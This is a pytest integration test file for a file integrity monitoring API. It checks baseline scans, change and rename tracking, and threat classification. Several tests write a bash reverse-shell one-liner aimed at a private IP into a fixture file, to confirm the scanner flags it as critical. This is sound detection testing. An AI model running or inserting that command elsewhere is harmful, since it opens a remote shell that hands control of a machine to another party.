"""
test_api_integration.py — end-to-end FastAPI integration tests.

Covers the regression class the Phase 7 investigation surfaced:
a baseline scan + file modification must produce visible state on the
public API (/api/baseline, /api/files/timeline), and the
is_baseline flag must flip to False after modification.

Each test isolates state via a fresh sqlite DB in a tmp_path fixture,
applied before any core.* import is cached.
"""
from __future__ import annotations

import os
import sys
import tempfile
import time
from pathlib import Path

import pytest
import sqlalchemy
from sqlalchemy.orm import sessionmaker

# Ensure project root is importable.
_PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(_PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(_PROJECT_ROOT))


@pytest.fixture
def isolated_app(tmp_path):
    """Spin up the FastAPI app against a fresh sqlite DB under tmp_path."""
    from core import database as _db

    # Patch the global engine + session before scanner / api import them.
    db_file = tmp_path / "fim_test.db"
    engine = sqlalchemy.create_engine(
        f"sqlite:///{db_file}", connect_args={"check_same_thread": False}
    )
    _db.engine = engine
    _db.SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
    _db.DATABASE_PATH = str(db_file)
    _db.DATABASE_URL = f"sqlite:///{db_file}"
    _db.init_db()

    from core import scanner, background_analysis, watcher, api as api_mod
    scanner.SessionLocal = _db.SessionLocal
    background_analysis.SessionLocal = _db.SessionLocal
    watcher.SessionLocal = _db.SessionLocal
    api_mod.SessionLocal = _db.SessionLocal

    from fastapi.testclient import TestClient
    client = TestClient(api_mod.app)

    workdir = tmp_path / "target"
    workdir.mkdir()

    yield {
        "client": client,
        "workdir": workdir,
        "scanner": scanner,
        "watcher": watcher,
        "background_analysis": background_analysis,
        "db": _db,
    }


def _drain_analysis(ctx) -> None:
    """Run the background analyser until the queue is empty."""
    for _ in range(3):
        processed = ctx["background_analysis"].process_pending_analysis(batch_size=200)
        if processed == 0:
            return


def test_scan_creates_file_record_and_log(isolated_app):
    """Baseline scan -> /api/baseline lists the file with change_count >= 1."""
    ctx = isolated_app
    f = ctx["workdir"] / "alpha.txt"
    f.write_text("hello\n", encoding="utf-8")

    ctx["scanner"].scan_and_baseline(str(ctx["workdir"]))
    _drain_analysis(ctx)

    rows = ctx["client"].get("/api/baseline").json()
    assert any(r["path"].endswith("alpha.txt") for r in rows), rows
    row = next(r for r in rows if r["path"].endswith("alpha.txt"))
    assert row["change_count"] >= 1
    assert row["is_baseline"] is True


def test_modification_flips_is_baseline_and_increments_change_count(isolated_app):
    """The Phase 7 regression: a modification must reach the UI as 'drifted'."""
    ctx = isolated_app
    f = ctx["workdir"] / "alpha.txt"
    f.write_text("hello\n", encoding="utf-8")

    ctx["scanner"].scan_and_baseline(str(ctx["workdir"]))
    _drain_analysis(ctx)

    # Force a mtime delta so compare_and_log doesn't short-circuit.
    time.sleep(1.1)
    f.write_text("hello\nan extra line\n", encoding="utf-8")
    ctx["scanner"].compare_and_log(str(ctx["workdir"]))
    _drain_analysis(ctx)

    rows = ctx["client"].get("/api/baseline").json()
    row = next(r for r in rows if r["path"].endswith("alpha.txt"))
    assert row["change_count"] == 2, row
    assert row["is_baseline"] is False, "is_baseline must flip after modification"


def test_timeline_returns_full_event_history(isolated_app):
    """Selecting a file in the UI should surface every analysed event."""
    ctx = isolated_app
    f = ctx["workdir"] / "beta.txt"
    f.write_text("v1\n", encoding="utf-8")

    ctx["scanner"].scan_and_baseline(str(ctx["workdir"]))
    _drain_analysis(ctx)

    time.sleep(1.1)
    f.write_text("v2\n", encoding="utf-8")
    ctx["scanner"].compare_and_log(str(ctx["workdir"]))
    _drain_analysis(ctx)

    baseline = ctx["client"].get("/api/baseline").json()
    path = next(r["path"] for r in baseline if r["path"].endswith("beta.txt"))

    timeline = ctx["client"].get("/api/files/timeline", params={"path": path}).json()
    events = timeline["events"]
    types = [e["event_type"] for e in events]
    assert "new" in types
    assert "modified" in types
    # Every event should have reached a terminal status.
    assert all(e["status"] in ("analyzed", "ignored", "recorded") for e in events), events


def test_compare_uses_metadata_first_for_unchanged_files(isolated_app):
    """A no-op compare should skip content hashing for unchanged tracked files."""
    ctx = isolated_app
    f = ctx["workdir"] / "stable.txt"
    f.write_text("stable\n", encoding="utf-8")

    ctx["scanner"].scan_and_baseline(str(ctx["workdir"]))
    result = ctx["scanner"].compare_and_log(str(ctx["workdir"]))

    assert result["modified"] == 0, result
    assert result["metadata_skipped"] >= 1, result
    assert result["hashed"] == 0, result


def test_api_scan_persists_session_counters(isolated_app):
    """API scans should leave an auditable optimization summary behind."""
    ctx = isolated_app
    f = ctx["workdir"] / "session.txt"
    f.write_text("session counters\n", encoding="utf-8")

    response = ctx["client"].post("/api/scan", json={"path": str(ctx["workdir"])})
    assert response.status_code == 200, response.text
    body = response.json()
    assert body["scan_session_id"] is not None

    latest = ctx["client"].get("/api/scans/latest").json()
    assert latest["id"] == body["scan_session_id"], latest
    assert latest["status"] == "complete", latest
    assert latest["mode"] == "hash_first", latest
    assert latest["total_discovered"] == 1, latest
    assert latest["baseline_new"] == 1, latest
    assert latest["metadata_skipped"] == 0, latest
    assert latest["hashed"] == 0, latest

    status = ctx["client"].get("/api/scan/status").json()
    assert status["scan_mode"] == "hash_first", status
    assert status["files_per_second"] >= 0, status
    assert status["bytes_processed"] > 0, status
    assert status["commit_count"] >= 1, status
    assert status["result"]["baseline"]["mb_per_second"] >= 0, status


def test_system_monitor_starts_visible_directory_scan(isolated_app, monkeypatch):
    """System Monitor should index watched paths into the visible file tree."""
    ctx = isolated_app
    f = ctx["workdir"] / "system-monitor.txt"
    f.write_text("system monitor baseline\n", encoding="utf-8")

    from core import api as api_mod

    monkeypatch.setattr(api_mod, "collect_system_monitor_paths", lambda: [str(ctx["workdir"])])
    monkeypatch.setattr(api_mod, "collect_system_registry_paths", lambda: [])
    monkeypatch.setattr(api_mod, "is_registry_supported", lambda: False)

    try:
        response = ctx["client"].post("/api/system-monitor/toggle", json={"enabled": True})
        assert response.status_code == 200, response.text
        body = response.json()
        assert body["scan_started"] is True
        assert body["scan_path_count"] == 1

        scan_status = ctx["client"].get("/api/scan/status").json()
        assert scan_status["active"] is False, scan_status
        assert scan_status["stage"] == "complete", scan_status
        assert scan_status["result"]["system_monitor"]["completed_paths"] == 1

        latest = ctx["client"].get("/api/scans/latest").json()
        assert latest["trigger"] == "system_monitor", latest
        assert latest["total_discovered"] == 1, latest

        baseline = ctx["client"].get("/api/baseline").json()
        assert any(row["path"].endswith("system-monitor.txt") for row in baseline)
    finally:
        ctx["client"].post("/api/system-monitor/toggle", json={"enabled": False})


def test_baseline_scan_queues_only_suspicious_files(isolated_app):
    """Benign baseline files should not inflate the pending-analysis backlog."""
    ctx = isolated_app
    benign = ctx["workdir"] / "notes.txt"
    danger = ctx["workdir"] / "danger.sh"
    benign.write_text("ordinary project notes\n", encoding="utf-8")
    danger.write_text("#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n", encoding="utf-8")

    result = ctx["scanner"].scan_and_baseline(str(ctx["workdir"]))

    assert result["new_baselined"] == 2, result
    assert result["baseline_analysis_queued"] == 1, result

    stats = ctx["client"].get("/api/stats").json()
    assert stats["monitored_files"] == 2
    assert stats["pending"] == 1


def test_hash_first_baseline_defers_low_value_content_analysis(isolated_app):
    """Hash-first baseline should capture integrity state before content context."""
    ctx = isolated_app
    f = ctx["workdir"] / "notes.txt"
    f.write_text("ordinary project notes\n", encoding="utf-8")

    ctx["scanner"].scan_and_baseline(str(ctx["workdir"]))

    rows = ctx["client"].get("/api/baseline").json()
    row = next(r for r in rows if r["path"].endswith("notes.txt"))
    assert row["initial_analysis"], row
    assert "Hash-first baseline captured" in row["initial_analysis"]

    timeline = ctx["client"].get("/api/files/timeline", params={"path": row["path"]}).json()
    event = timeline["events"][0]
    assert event["status"] == "recorded"
    assert event["analysis"]["baseline_context"] is True
    assert event["analysis"]["analysis_source"] == "hash_first"
    assert event["analysis"]["analysis_deferred"] is False


def test_deferred_baseline_analysis_reads_content_after_hash_capture(isolated_app, monkeypatch):
    """Queued hash-first baseline events should read content in the analysis phase."""
    ctx = isolated_app
    f = ctx["workdir"] / "danger.sh"
    f.write_text("#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n", encoding="utf-8")

    ctx["scanner"].scan_and_baseline(str(ctx["workdir"]))

    stats = ctx["client"].get("/api/stats").json()
    assert stats["pending"] == 1

    monkeypatch.setattr(ctx["background_analysis"], "_BACKLOG_THRESHOLD", 1)
    _drain_analysis(ctx)

    rows = ctx["client"].get("/api/baseline").json()
    row = next(r for r in rows if r["path"].endswith("danger.sh"))
    timeline = ctx["client"].get("/api/files/timeline", params={"path": row["path"]}).json()
    event = timeline["events"][0]
    assert event["status"] == "analyzed"
    assert event["analysis"]["analysis_source"] in {"heuristic", "fallback", "ollama"}
    assert event["analysis"]["priority"] == "critical"
    assert "Reverse Shell" in event["analysis"]["reasoning"]


def test_legacy_baseline_triage_payload_is_unwrapped(isolated_app):
    """Old rows stored baseline triage nested under baseline_triage."""
    ctx = isolated_app
    from core.models import FileLog, FileRecord

    path = str(ctx["workdir"] / "legacy.txt")
    session = ctx["db"].SessionLocal()
    try:
        session.add(FileRecord(path=path, hash="abc123", is_baseline=True, size=12))
        session.add(FileLog(
            path=path,
            event_type="new",
            new_hash="abc123",
            details="Baseline scan",
            status="recorded",
            priority="info",
            analysis_json={
                "diff": "legacy content\n",
                "metadata": {},
                "is_baseline": True,
                "baseline_triage": {
                    "risk_score": 1,
                    "priority": "info",
                    "is_malicious": False,
                    "threat_type": "benign",
                    "threat_classification": "Benign Text File",
                    "reasoning": "Legacy baseline triage is visible.",
                    "analysis_source": "heuristic",
                    "findings": [],
                    "recommended_actions": [],
                },
            },
        ))
        session.commit()
    finally:
        session.close()

    timeline = ctx["client"].get("/api/files/timeline", params={"path": path}).json()
    analysis = timeline["events"][0]["analysis"]
    assert analysis["baseline_context"] is True
    assert analysis["reasoning"] == "Legacy baseline triage is visible."


def test_scan_populates_lazy_directory_tree(isolated_app):
    """Directory nodes should support lazy tree browsing after scans."""
    ctx = isolated_app
    nested = ctx["workdir"] / "alpha" / "beta"
    nested.mkdir(parents=True)
    f = nested / "file.txt"
    f.write_text("ordinary text\n", encoding="utf-8")

    ctx["scanner"].scan_and_baseline(str(ctx["workdir"]))

    from core.models import DirectoryNode
    session = ctx["db"].SessionLocal()
    try:
        workdir_node = (
            session.query(DirectoryNode)
            .filter(DirectoryNode.full_path == str(ctx["workdir"]))
            .first()
        )
        assert workdir_node is not None
    finally:
        session.close()

    root_level = ctx["client"].get("/api/tree", params={"parent_id": workdir_node.id}).json()
    assert any(d["name"] == "alpha" for d in root_level["directories"]), root_level

    alpha_id = next(d["id"] for d in root_level["directories"] if d["name"] == "alpha")
    alpha_level = ctx["client"].get("/api/tree", params={"parent_id": alpha_id}).json()
    beta_id = next(d["id"] for d in alpha_level["directories"] if d["name"] == "beta")

    beta_level = ctx["client"].get("/api/tree", params={"parent_id": beta_id}).json()
    assert any(item["name"] == "file.txt" for item in beta_level["files"]), beta_level


def test_rename_preserves_single_file_timeline(isolated_app):
    """A same-content rename should not appear as separate deleted/new files."""
    ctx = isolated_app
    old_file = ctx["workdir"] / "New Text Document.txt"
    new_file = ctx["workdir"] / "text 2.txt"
    old_file.write_text("same content\n", encoding="utf-8")

    ctx["scanner"].scan_and_baseline(str(ctx["workdir"]))
    old_file.rename(new_file)
    result = ctx["scanner"].compare_and_log(str(ctx["workdir"]))

    assert result["renamed"] == 1, result
    assert result["new"] == 0, result
    assert result["deleted"] == 0, result

    rows = ctx["client"].get("/api/baseline").json()
    assert not any(r["path"].endswith("New Text Document.txt") for r in rows), rows
    row = next(r for r in rows if r["path"].endswith("text 2.txt"))
    assert row["file_id"] is not None, row
    assert row["change_count"] == 2, row

    timeline = ctx["client"].get("/api/files/timeline", params={"path": row["path"]}).json()
    events = timeline["events"]
    assert [e["event_type"] for e in events] == ["new", "renamed"]
    assert "New Text Document.txt" in events[-1]["details"]

    identity_timeline = ctx["client"].get(
        "/api/files/timeline", params={"file_id": row["file_id"]}
    ).json()
    assert [e["event_type"] for e in identity_timeline["events"]] == ["new", "renamed"]


def test_created_event_can_recover_missed_rename(isolated_app):
    """Windows-style create-only rename notifications should preserve identity."""
    ctx = isolated_app
    old_file = ctx["workdir"] / "old-name.txt"
    new_file = ctx["workdir"] / "new-name.txt"
    old_file.write_text("same content\n", encoding="utf-8")

    ctx["scanner"].scan_and_baseline(str(ctx["workdir"]))
    old_file.rename(new_file)

    handler = ctx["watcher"].IntegrityEventHandler()
    handler._handle_event(str(new_file), "new")

    rows = ctx["client"].get("/api/baseline").json()
    assert not any(r["path"].endswith("old-name.txt") for r in rows), rows
    row = next(r for r in rows if r["path"].endswith("new-name.txt"))
    assert row["change_count"] == 2, row

    timeline = ctx["client"].get("/api/files/timeline", params={"path": row["path"]}).json()
    assert [e["event_type"] for e in timeline["events"]] == ["new", "renamed"]


def test_threat_content_classified_as_critical(isolated_app):
    """A reverse-shell pattern must produce a critical or high alert."""
    ctx = isolated_app
    f = ctx["workdir"] / "danger.sh"
    f.write_text("placeholder\n", encoding="utf-8")
    ctx["scanner"].scan_and_baseline(str(ctx["workdir"]))
    _drain_analysis(ctx)

    time.sleep(1.1)
    f.write_text(
        "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n",
        encoding="utf-8",
    )
    ctx["scanner"].compare_and_log(str(ctx["workdir"]))
    # Mark dir as actively watched so Tier 1/2 suppression doesn't fire.
    ctx["background_analysis"].update_monitor_state(True, [str(ctx["workdir"])])
    _drain_analysis(ctx)

    baseline = ctx["client"].get("/api/baseline").json()
    row = next(r for r in baseline if r["path"].endswith("danger.sh"))
    assert row["highest_priority"] in ("critical", "high"), row
